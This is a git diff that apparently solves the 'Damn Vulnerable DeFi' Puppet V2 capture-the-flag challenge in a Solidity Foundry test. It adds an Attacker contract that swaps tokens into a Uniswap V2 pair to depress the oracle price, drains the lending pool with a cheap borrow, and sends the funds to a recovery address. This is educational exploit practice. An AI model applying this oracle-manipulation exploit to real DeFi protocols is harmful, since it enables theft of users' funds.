@@ -10,6 +10,51 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 
+event ReservesNotice(uint256 r0, uint256 r1);
+
+event BalanceNotice(uint256 myWethBal);
+
+contract Attacker {
+    IUniswapV2Router02 immutable uniswapV2Router;
+    WETH immutable private weth;
+    PuppetV2Pool immutable private lendingPool;
+    DamnValuableToken immutable private token;
+    address immutable private recovery;
+
+    constructor(
+        IUniswapV2Router02 _uniswapV2Router,
+        WETH _weth,
+        PuppetV2Pool _lendingPool,
+        DamnValuableToken _token,
+        address _recovery
+    ) {
+        uniswapV2Router = _uniswapV2Router;
+        weth = _weth;
+        lendingPool = _lendingPool;
+        token = _token;
+        recovery = _recovery;
+
+        token.approve(address(_uniswapV2Router), type(uint256).max);
+        weth.approve(address(_lendingPool), type(uint256).max);
+    }
+
+    function execute() external {
+        address[] memory tokenToWeth = new address[](2);
+        tokenToWeth[0] = address(token);
+        tokenToWeth[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokens(
+            token.balanceOf(address(this)),
+            0,
+            tokenToWeth,
+            address(this),
+            block.timestamp
+        );
+
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
+
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -98,7 +143,12 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        assertEq(uniswapV2Exchange.token0(), address(weth), "Weth must be token0");
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        Attacker attacker = new Attacker(uniswapV2Router, weth, lendingPool, token, recovery);
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        weth.transfer(address(attacker), PLAYER_INITIAL_ETH_BALANCE);
+        attacker.execute();
     }
 
     /**
